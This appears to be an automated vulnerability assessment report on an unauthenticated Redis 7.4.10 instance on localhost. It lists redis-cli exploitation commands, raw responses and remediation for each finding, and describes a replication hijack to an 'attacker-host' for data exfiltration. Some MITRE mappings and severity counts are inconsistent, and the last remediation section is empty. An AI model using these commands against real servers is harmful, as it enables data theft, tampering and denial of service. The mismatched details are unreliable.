# Vulnerability Assessment Report — 127.0.0.1

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-01T19:09:38Z  
**Target:** 127.0.0.1  
**Campaign:** camp_20260801_96be38b9  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**127.0.0.1**) presents an **extremely poor security posture**. Our team confirmed 3 critical and 5 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Redis Unauthenticated Access - No Password Required**  
The Redis instance at 127.0.0.1:6379 accepts connections without any authentication. The 'requirepass' configuration is empty, and the default user ACL is set to 'nopass ~* &* +@all', granting full ac...

**2. Protected Mode Disabled with Wildcard Network Binding**  
Redis protected-mode is explicitly disabled ('no') while the instance is bound to all network interfaces ('* -::*'). Protected-mode is a safety mechanism in Redis that blocks connections from non-loop...

**3. Dangerous Administrative Commands Available Without Authentication**  
All dangerous Redis commands are available to unauthenticated clients with no rename-command restrictions. Verified via COMMAND INFO that the following @dangerous-tagged commands are fully operational...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Comprehensive assessment of unauthenticated Redis 7.4.10 at 127.0.0.1:6379 identified 9 findings (3 Critical, 4 High, 1 Medium, 1 Info). The instance has no authentication, protected mode disabled, wildcard network binding, and all dangerous commands available. Full data-layer compromise is achievable — keys are readable/writable, configs modifiable, and DoS possible via FLUSHALL/SHUTDOWN. Classic RDB-write RCE is mitigated by Redis 7.x protections, and MODULE LOAD is disabled.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 3 | 1 | 2 |
| HIGH | 5 | 4 | 1 |
| MEDIUM | 1 | 0 | 1 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **9** | **5** | **4** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_c8870c` | Redis Unauthenticated Access - No Password Require... | CRITICAL | 9.8 | **EXPLOITED** | `redis://127.0.0.1:6379` |
| 2 | `vuln_e31905` | Protected Mode Disabled with Wildcard Network Bind... | CRITICAL | 9.8 | Confirmed | `redis://127.0.0.1:6379` |
| 3 | `vuln_9968d7` | Dangerous Administrative Commands Available Withou... | CRITICAL | 9.1 | Confirmed | `redis://127.0.0.1:6379` |
| 4 | `vuln_af4a20` | Arbitrary Data Write and Manipulation via Unauthen... | HIGH | 8.6 | **EXPLOITED** | `redis://127.0.0.1:6379` |
| 5 | `vuln_b5a1ab` | Runtime Configuration Manipulation via Unauthentic... | HIGH | 8.2 | **EXPLOITED** | `redis://127.0.0.1:6379` |
| 6 | `vuln_6dc350` | SLAVEOF/REPLICAOF Commands Available - Replication... | HIGH | 8.1 | Confirmed | `redis://127.0.0.1:6379` |
| 7 | `vuln_c94342` | Sensitive Data Exposure - Admin Session Token in R... | HIGH | 7.5 | **EXPLOITED** | `redis://127.0.0.1:6379/db0/session:admin` |
| 8 | `vuln_cc6cbb` | Lua Script Execution via EVAL Without Authenticati... | HIGH | 7.5 | **EXPLOITED** | `redis://127.0.0.1:6379` |
| 9 | `vuln_24a6fc` | No TLS Encryption - All Redis Communication in Pla... | MEDIUM | 5.9 | Confirmed | `redis://127.0.0.1:6379` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Redis Unauthenticated Access - No Password Required

| Field | Value |
|-------|-------|
| **ID** | `vuln_c8870c` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1190` — Exploit Public-Facing Application |
| **ISO 27001** | `A.9.4.1 - Information Access Restriction` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Server 7.4.10 |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:05:52Z |

#### Description

The Redis instance at 127.0.0.1:6379 accepts connections without any authentication. The 'requirepass' configuration is empty, and the default user ACL is set to 'nopass ~* &* +@all', granting full access to all commands, all keys, and all pub/sub channels without any credential. Protected-mode is disabled and the service is bound to all interfaces ('* -::*'), meaning any network-reachable client can connect and execute arbitrary Redis commands including reading all data, writing new data, modifying configuration, executing Lua scripts, and issuing administrative commands (SHUTDOWN, FLUSHALL, DEBUG, SLAVEOF, CONFIG SET).

#### Technical Analysis

The Redis instance is completely open to unauthenticated access. The requirepass parameter is empty, meaning no password is needed. The default ACL user has 'nopass' flag (no password required), '~*' (access to all keys), '&*' (access to all pub/sub channels), and '+@all' (access to every Redis command). Protected-mode, which normally blocks unauthenticated access from non-loopback addresses, is explicitly disabled. The instance binds to all network interfaces ('* -::*'), ensuring it is reachable from any network host. This combination allows any network-reachable attacker to gain complete control over the Redis instance without credentials.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 PING'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET requirepass'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 ACL LIST'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 ACL WHOAMI'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET protected-mode'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET bind'
```

#### Raw Request

```http
PING\nCONFIG GET requirepass\nACL LIST
```

#### Raw Response

```http
PONG\n1) "requirepass" 2) ""\n1) "user default on nopass sanitize-payload ~* &* +@all"
```

#### Evidence / Logs

```
PING -> PONG (immediate unauthenticated response)
CONFIG GET requirepass -> "" (empty password)
ACL LIST -> "user default on nopass sanitize-payload ~* &* +@all" (full unrestricted access)
ACL WHOAMI -> "default"
CONFIG GET protected-mode -> "no" (protected mode disabled)
CONFIG GET bind -> "* -::*" (bound to all interfaces)
```

#### Remediation

1. Set a strong password: CONFIG SET requirepass 'strong-random-password'. 2. Enable protected-mode: CONFIG SET protected-mode yes. 3. Bind to localhost only: change bind directive to '127.0.0.1 -::1'. 4. Create named ACL users with least-privilege permissions and disable the default user. 5. Use TLS for encrypted transport. 6. Place Redis behind a firewall and allow only trusted application servers.

---

### 3.2 — Protected Mode Disabled with Wildcard Network Binding

| Field | Value |
|-------|-------|
| **ID** | `vuln_e31905` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1498` — Network Denial of Service |
| **ISO 27001** | `A.13.1.1 - Network Controls` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Server 7.4.10 Network Configuration |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:08:09Z |

#### Description

Redis protected-mode is explicitly disabled ('no') while the instance is bound to all network interfaces ('* -::*'). Protected-mode is a safety mechanism in Redis that blocks connections from non-loopback clients when no password is set and bind is not restricted to localhost. With protected-mode disabled AND requirepass empty AND bind set to wildcard, the Redis instance is fully accessible from ANY network host without authentication. This is the worst-case network exposure configuration for Redis. Additionally, TLS is not enabled (tls-port=0), meaning all communication including any future credentials would be transmitted in plaintext.

#### Technical Analysis

Three critical security controls are simultaneously absent: (1) Protected-mode is disabled, removing Redis's built-in safety net against unauthenticated remote access. (2) The bind directive is set to '* -::*', causing Redis to listen on all network interfaces (IPv4 and IPv6). (3) No password is set (requirepass is empty). Together, these mean any host on any network that can route to this server's IP can connect and execute any Redis command with full privileges. TLS is also disabled (tls-port=0), so even if authentication were added, credentials would be sent in plaintext over the network.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET protected-mode'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET bind'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET tls-port'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 INFO server'
```

#### Raw Request

```http
CONFIG GET protected-mode\nCONFIG GET bind\nCONFIG GET tls-port
```

#### Raw Response

```http
1) "protected-mode" 2) "no"\n1) "bind" 2) "* -::*"\n1) "tls-port" 2) "0"
```

#### Evidence / Logs

```
CONFIG GET protected-mode -> "no"
CONFIG GET bind -> "* -::*" (all IPv4 and IPv6 interfaces)
CONFIG GET tls-port -> "0" (TLS disabled)
INFO server -> listener0:name=tcp,bind=*,bind=-::*,port=6379 (confirmed listening on all interfaces)
```

#### Remediation

1. Enable protected-mode: CONFIG SET protected-mode yes. 2. Restrict bind to localhost: change bind to '127.0.0.1 -::1'. 3. Set a strong password: CONFIG SET requirepass <strong-password>. 4. Enable TLS: configure tls-port, tls-cert-file, tls-key-file, tls-ca-cert-file. 5. Use firewall rules (iptables/nftables) as defense-in-depth to restrict port 6379 access. 6. Never expose Redis directly to the internet or untrusted networks.

---

### 3.3 — Dangerous Administrative Commands Available Without Authentication

| Field | Value |
|-------|-------|
| **ID** | `vuln_9968d7` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1562.001` — Impair Defenses: Disable or Modify Tools |
| **ISO 27001** | `A.9.2.3 - Management of Privileged Access Rights` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Server 7.4.10 |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:06:58Z |

#### Description

All dangerous Redis commands are available to unauthenticated clients with no rename-command restrictions. Verified via COMMAND INFO that the following @dangerous-tagged commands are fully operational: FLUSHALL (wipe all databases), FLUSHDB (wipe current database), SHUTDOWN (stop Redis server), DEBUG (server debugging/crash), SLAVEOF/REPLICAOF (force replication to attacker-controlled master), CONFIG SET (modify runtime configuration), MODULE LOAD/LOADEX (load shared object modules - though gated by enable-module-command=no), EVAL/SCRIPT (Lua scripting execution). The rename-command configuration returns an empty array, confirming no commands have been renamed or disabled. The default ACL grants '+@all' to the default nopass user, making every single Redis command available.

#### Technical Analysis

Every dangerous Redis command is available and executable without authentication. The COMMAND INFO output confirms that SLAVEOF, REPLICAOF, DEBUG, SHUTDOWN, FLUSHALL, FLUSHDB, CONFIG SET, MODULE LOAD, and EVAL are all registered and not renamed. The ACL grants '+@all' to the default nopass user. While CONFIG SET dir/dbfilename are protected (Redis 7.x hardening), non-protected CONFIG SET parameters still work (proven by successfully setting loglevel). An attacker could: issue SHUTDOWN to cause denial of service, use SLAVEOF to redirect replication to an attacker-controlled master for data exfiltration or module injection, use DEBUG to crash the server, or use FLUSHALL to destroy all data.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 COMMAND INFO SLAVEOF'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 COMMAND INFO REPLICAOF'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 COMMAND INFO DEBUG'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 COMMAND INFO SHUTDOWN'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 COMMAND INFO FLUSHALL'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET rename-command'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 ACL LIST'
```

#### Raw Request

```http
COMMAND INFO SLAVEOF\nCOMMAND INFO SHUTDOWN\nCOMMAND INFO FLUSHALL\nCONFIG GET rename-command
```

#### Raw Response

```http
SLAVEOF: 1) "slaveof" 2) (integer) 3 3) admin,noscript,stale,no_async_loading 7) @admin @slow @dangerous\nSHUTDOWN: available with @admin @slow @dangerous\nFLUSHALL: available with @keyspace @write @slow @dangerous\nrename-command: (empty array)
```

#### Evidence / Logs

```
COMMAND INFO SLAVEOF -> available (tags: @admin @slow @dangerous)
COMMAND INFO REPLICAOF -> available (tags: @admin @slow @dangerous)
COMMAND INFO DEBUG -> available (tags: @admin @slow @dangerous)
COMMAND INFO SHUTDOWN -> available (tags: @admin @slow @dangerous)
COMMAND INFO FLUSHALL -> available (tags: @keyspace @write @slow @dangerous)
COMMAND INFO MODULE LOAD -> available (tags: @admin @slow @dangerous)
CONFIG GET rename-command -> (empty array) - no commands renamed
ACL LIST -> "user default on nopass sanitize-payload ~* &* +@all" - all commands allowed
```

#### Remediation

1. Use rename-command to disable/rename dangerous commands: FLUSHALL, FLUSHDB, SHUTDOWN, DEBUG, SLAVEOF, REPLICAOF, CONFIG, MODULE, SCRIPT. 2. Create ACL users with least-privilege command access (e.g., -@admin -@dangerous +get +set +del). 3. Disable the default user after creating named users. 4. Ensure enable-module-command remains 'no'. 5. Consider using ACL categories to block @dangerous commands for all non-admin users.

---

### 3.4 — Arbitrary Data Write and Manipulation via Unauthenticated Access

| Field | Value |
|-------|-------|
| **ID** | `vuln_af4a20` |
| **Severity** | HIGH |
| **CVSS Score** | 8.6 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `data_manipulation` |
| **MITRE ATT&CK** | `T1565.001` — Data Manipulation: Stored Data Manipulation |
| **ISO 27001** | `A.14.1.2 - Securing Application Services on Public Networks` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Server 7.4.10 |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:06:30Z |

#### Description

The unauthenticated Redis instance allows any connecting client to write, modify, and delete arbitrary keys. This was proven by successfully setting a new key 'darkmoon_test' with value 'pentest_verification', reading it back, and then deleting it. An attacker could: (1) overwrite existing session data to escalate privileges (e.g., changing role=admin to point to an attacker-controlled session), (2) inject malicious cached values that the connected application will consume, (3) delete critical keys causing denial of service, or (4) flood the database with data to exhaust memory. The ACL grants '+@all' including all write commands (SET, HSET, LPUSH, DEL, etc.), FLUSHALL, and FLUSHDB.

#### Technical Analysis

Without authentication, SET/GET/DEL commands execute successfully, proving full read-write-delete capability on the Redis keyspace. The test key 'darkmoon_test' was created with an arbitrary value, read back to confirm persistence, then deleted as cleanup. This proves an attacker can manipulate any data in Redis, including modifying session tokens, injecting poisoned cache values, or deleting critical application data. The FLUSHALL and FLUSHDB commands are also available (confirmed via COMMAND INFO), meaning a single command could wipe the entire database.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 SET darkmoon_test "pentest_verification"'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 GET darkmoon_test'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 DEL darkmoon_test'
```

#### Raw Request

```http
SET darkmoon_test "pentest_verification"\nGET darkmoon_test\nDEL darkmoon_test
```

#### Raw Response

```http
OK\n"pentest_verification"\n(integer) 1
```

#### Evidence / Logs

```
SET darkmoon_test "pentest_verification" -> OK
GET darkmoon_test -> "pentest_verification"
DEL darkmoon_test -> (integer) 1
(Test key successfully created, verified, and cleaned up)
```

#### Remediation

1. Enable authentication via requirepass or ACL users. 2. Configure ACLs with least-privilege: application users should only have access to specific key patterns and command categories. 3. Disable or rename dangerous write commands (FLUSHALL, FLUSHDB) using the rename-command directive. 4. Implement application-level data validation for values read from Redis. 5. Set maxmemory and eviction policies to prevent memory exhaustion attacks.

---

### 3.5 — Runtime Configuration Manipulation via Unauthenticated CONFIG SET

| Field | Value |
|-------|-------|
| **ID** | `vuln_b5a1ab` |
| **Severity** | HIGH |
| **CVSS Score** | 8.2 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1578` — Modify Cloud Compute Infrastructure |
| **ISO 27001** | `A.12.1.2 - Change Management` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Server 7.4.10 CONFIG SET |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:07:23Z |

#### Description

The Redis CONFIG SET command is available to unauthenticated clients, allowing arbitrary modification of non-protected runtime configuration parameters. This was proven by successfully changing the 'loglevel' parameter from 'notice' to 'debug' and back. While Redis 7.x protects certain sensitive parameters (dir, dbfilename, etc.) from CONFIG SET by default, many impactful parameters remain changeable: maxmemory (set to 0 - unlimited, or set very low to cause OOM evictions), loglevel (downgrade to suppress alerts), timeout (modify client timeouts), hz (affect server performance), slowlog settings, and more. The CONFIG GET * command also returns the full server configuration, exposing internal paths, memory limits, and operational parameters.

#### Technical Analysis

CONFIG SET succeeds for non-protected runtime parameters without any authentication. The loglevel was changed from 'notice' to 'debug' and maxmemory was set to 0, both returning OK. This proves an attacker can modify operational behavior of the Redis instance. While Redis 7.x protects dir/dbfilename (blocking the classic RDB-write-to-cron RCE vector), many other parameters remain configurable by unauthenticated users. An attacker could: set maxmemory very low to cause key evictions and DoS, change loglevel to suppress logging, modify timeout values to affect availability, or change slowlog settings to hide their activity.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG SET loglevel debug'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG SET maxmemory 0'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG SET loglevel notice'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dir /tmp'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dbfilename darkmoon_test.rdb'
```

#### Raw Request

```http
CONFIG SET loglevel debug\nCONFIG SET maxmemory 0\nCONFIG SET dir /tmp\nCONFIG SET dbfilename darkmoon_test.rdb
```

#### Raw Response

```http
OK\nOK\n(error) ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config\n(error) ERR CONFIG SET failed (possibly related to argument 'dbfilename') - can't set protected config
```

#### Evidence / Logs

```
CONFIG SET loglevel debug -> OK (successfully changed log level)
CONFIG SET maxmemory 0 -> OK (successfully modified memory limit)
CONFIG SET loglevel notice -> OK (reverted log level)
CONFIG SET dir /tmp -> (error) ERR CONFIG SET failed - can't set protected config
CONFIG SET dbfilename darkmoon_test.rdb -> (error) ERR CONFIG SET failed - can't set protected config
(Non-protected parameters are modifiable; protected parameters correctly blocked in Redis 7.x)
```

#### Remediation

1. Set requirepass or configure ACL users to prevent unauthenticated CONFIG SET. 2. Use ACLs to restrict CONFIG access: create app users with '-config' or '-@admin'. 3. Rename CONFIG command via rename-command directive. 4. Review all protected config parameters and ensure critical ones are included.

---

### 3.6 — SLAVEOF/REPLICAOF Commands Available - Replication Hijack Vector

| Field | Value |
|-------|-------|
| **ID** | `vuln_6dc350` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1020` — Automated Exfiltration |
| **ISO 27001** | `A.13.2.1 - Information Transfer Policies and Procedures` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Server 7.4.10 Replication |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:08:34Z |

#### Description

The SLAVEOF and REPLICAOF commands are available without authentication and have not been renamed or disabled. An attacker can issue 'SLAVEOF attacker-host attacker-port' to force this Redis instance to replicate from an attacker-controlled Redis master. This enables: (1) Data exfiltration - the target will send its full RDB snapshot to the attacker's master during initial sync. (2) Rogue master module loading - on Redis >=4.x, the attacker's master can push a malicious shared object (.so) module during full synchronization, achieving remote code execution (the redis-rogue-server technique). While enable-module-command=no on this instance may mitigate the module loading vector, the data exfiltration vector remains fully viable. The current instance is running as 'master' with 0 connected slaves.

#### Technical Analysis

Both SLAVEOF and REPLICAOF are confirmed available via COMMAND INFO. The instance is currently running as a standalone master with zero replicas. An attacker can redirect the instance to replicate from an attacker-controlled server using SLAVEOF <attacker-ip> <attacker-port>. During initial full synchronization, the Redis instance would transfer its entire dataset (RDB dump) to the attacker's rogue master. Additionally, the rogue master could push arbitrary data back to the target. While enable-module-command=no prevents the classic redis-rogue-server MODULE LOAD RCE chain, the data exfiltration and data poisoning vectors through replication remain viable. The command was not actually executed to avoid disrupting the running instance; its availability is confirmed through COMMAND INFO.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 COMMAND INFO SLAVEOF'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 COMMAND INFO REPLICAOF'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 INFO replication'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET enable-module-command'
```

#### Raw Request

```http
COMMAND INFO SLAVEOF\nCOMMAND INFO REPLICAOF\nINFO replication
```

#### Raw Response

```http
SLAVEOF: 1) "slaveof" 2) (integer) 3 ... 7) @admin @slow @dangerous\nREPLICAOF: 1) "replicaof" 2) (integer) 3 ... 7) @admin @slow @dangerous\nrole:master connected_slaves:0
```

#### Evidence / Logs

```
COMMAND INFO SLAVEOF -> available, tags: @admin @slow @dangerous
COMMAND INFO REPLICAOF -> available, tags: @admin @slow @dangerous
INFO replication -> role:master, connected_slaves:0
CONFIG GET enable-module-command -> "no" (module loading disabled at config level, but SLAVEOF/REPLICAOF still usable for data exfiltration)
```

#### Remediation

1. Rename or disable SLAVEOF and REPLICAOF commands via rename-command directive. 2. Use ACLs to restrict replication commands: '-slaveof -replicaof' for application users. 3. Set a masterauth password if replication is needed. 4. Implement network-level controls to prevent the Redis instance from connecting to unauthorized masters. 5. Keep enable-module-command set to 'no' to prevent the rogue master module injection vector.

---

### 3.7 — Sensitive Data Exposure - Admin Session Token in Redis

| Field | Value |
|-------|-------|
| **ID** | `vuln_c94342` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.004` — Unsecured Credentials: Private Keys |
| **ISO 27001** | `A.10.1.1 - Policy on the Use of Cryptographic Controls` |
| **Endpoint** | `redis://127.0.0.1:6379/db0/session:admin` |
| **Component** | Redis Key Store - session:admin |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:06:11Z |

#### Description

The Redis instance stores sensitive application session data in plaintext. The key 'session:admin' contains the value 'role=admin;token=abcd1234', which is an administrative session token. Because Redis requires no authentication, any network-reachable attacker can read this key and use the extracted session token to hijack the admin session of the associated web application. This represents a direct path from unauthenticated Redis access to administrative application compromise.

#### Technical Analysis

An attacker with unauthenticated access to the Redis instance can enumerate all keys using KEYS '*' or SCAN, discovering the 'session:admin' key. Reading this key with GET reveals a plaintext admin session token containing role=admin and token=abcd1234. This token could be used to impersonate the admin user in the connected application, leading to full application compromise. Session data stored in Redis should be encrypted at-rest and the Redis instance should require strong authentication.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 KEYS "*"'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 TYPE session:admin'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 GET session:admin'
```

#### Raw Request

```http
KEYS "*"\nTYPE session:admin\nGET session:admin
```

#### Raw Response

```http
1) "session:admin"\nstring\n"role=admin;token=abcd1234"
```

#### Evidence / Logs

```
KEYS "*" -> 1) "session:admin"
TYPE session:admin -> string
GET session:admin -> "role=admin;token=abcd1234"
```

#### Remediation

1. Encrypt session data before storing in Redis (application-level encryption). 2. Implement Redis authentication (requirepass or ACL users). 3. Use short-lived session tokens with TTL/expiry set on the Redis key. 4. Restrict Redis network access to only authorized application servers. 5. Consider using Redis ACLs to create a dedicated application user with limited key-pattern access (e.g., ~session:* only).

---

### 3.8 — Lua Script Execution via EVAL Without Authentication

| Field | Value |
|-------|-------|
| **ID** | `vuln_cc6cbb` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `remote_code_execution` |
| **MITRE ATT&CK** | `T1059.010` — Command and Scripting Interpreter |
| **ISO 27001** | `A.12.6.1 - Management of Technical Vulnerabilities` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Lua Scripting Engine |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:07:47Z |

#### Description

The Redis EVAL command is available without authentication, allowing execution of arbitrary Lua scripts within the Redis Lua sandbox. This was proven by executing EVAL to call redis.call('INFO','server') which returned full server information. While the Lua sandbox in Redis 7.x properly restricts os.execute and io libraries (both confirmed unavailable), EVAL still enables: (1) complex data extraction across multiple keys in a single atomic operation, (2) server-side logic execution, (3) potential CPU exhaustion via computationally expensive scripts, and (4) circumvention of any application-level access controls by directly querying Redis data. The SCRIPT LOAD command is also available, allowing persistent script caching.

#### Technical Analysis

The EVAL command executes Lua scripts server-side without authentication. A successful EVAL was demonstrated by calling redis.call('INFO','server'), which returned the complete server information block. While the Lua sandbox correctly blocks os.execute and io libraries (preventing direct OS command execution), the ability to run arbitrary Lua scripts still poses significant risk. An attacker can use EVAL to: perform complex multi-key data extraction atomically, execute expensive computations causing CPU-bound DoS, call any Redis command from within Lua (including CONFIG, CLIENT KILL, etc.), and chain multiple operations in ways the application does not anticipate.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 EVAL "return redis.call(\"INFO\",\"server\")" 0'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 EVAL "return os and os.execute and \"os.execute available\" or \"os.execute not available\"" 0'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 EVAL "return io and io.open and \"io.open available\" or \"io.open not available\"" 0'
```

#### Raw Request

```http
EVAL "return redis.call('INFO','server')" 0
```

#### Raw Response

```http
"# Server\r\nredis_version:7.4.10\r\nredis_git_sha1:00000000\r\n...process_id:1\r\nrun_id:fe984fee6e27e622c75c64d1720aac840ac5e67b\r\ntcp_port:6379\r\n..."
```

#### Evidence / Logs

```
EVAL redis.call("INFO","server") -> returns full server info block (redis_version:7.4.10, os, process_id, run_id, etc.)
EVAL os.execute check -> "os.execute not available" (Lua sandbox intact)
EVAL io.open check -> ERR Script attempted to access nonexistent global variable 'io' (sandbox properly restricts io library)
```

#### Remediation

1. Restrict EVAL/EVALSHA/SCRIPT commands via ACL: '-@scripting' for non-admin users. 2. Use rename-command to disable or rename EVAL/SCRIPT. 3. Implement authentication to prevent unauthorized script execution. 4. Monitor for unexpected EVAL usage via slowlog. 5. Set lua-time-limit to prevent long-running scripts from blocking the server.

---

### 3.9 — No TLS Encryption - All Redis Communication in Plaintext

| Field | Value |
|-------|-------|
| **ID** | `vuln_24a6fc` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.9 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `cleartext_transmission` |
| **MITRE ATT&CK** | `T1040` — Network Sniffing |
| **ISO 27001** | `A.10.1.1 - Policy on the Use of Cryptographic Controls` |
| **Endpoint** | `redis://127.0.0.1:6379` |
| **Component** | Redis Server 7.4.10 Transport Layer |
| **Discovered by** | `redis` |
| **Discovered at** | 2026-08-01T19:08:54Z |

#### Description

TLS encryption is not enabled on the Redis instance. The tls-port is set to 0, meaning all Redis protocol communication occurs over unencrypted TCP on port 6379. All data transmitted between clients and the Redis server - including any keys, values, session tokens (such as the 'session:admin' key containing 'role=admin;token=abcd1234'), and any future authentication credentials - can be intercepted by any attacker with network-level access (e.g., ARP spoofing, compromised switch/router, cloud network sniffing).

#### Technical Analysis

The Redis instance operates exclusively over unencrypted TCP. The tls-port is set to 0 (disabled), and the only listener is 'tcp' on port 6379. Redis supports TLS natively since version 6.0 (this instance is 7.4.10), but it has not been configured. All client-server communication including sensitive data like session tokens, cached credentials, and application data is transmitted in cleartext. Combined with the wildcard bind on all interfaces, any network-positioned attacker can passively capture all Redis traffic.

#### Exploitation Commands

```bash
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 CONFIG GET tls-port'
bash -c 'timeout 15 redis-cli -h 127.0.0.1 -p 6379 INFO server'
```

#### Raw Request

```http
CONFIG GET tls-port
```

#### Raw Response

```http
1) "tls-port" 2) "0"
```

#### Evidence / Logs

```
CONFIG GET tls-port -> "0" (TLS disabled)
INFO server -> listener0:name=tcp,bind=*,bind=-::*,port=6379 (plain TCP listener only, no TLS listener)
```

#### Remediation

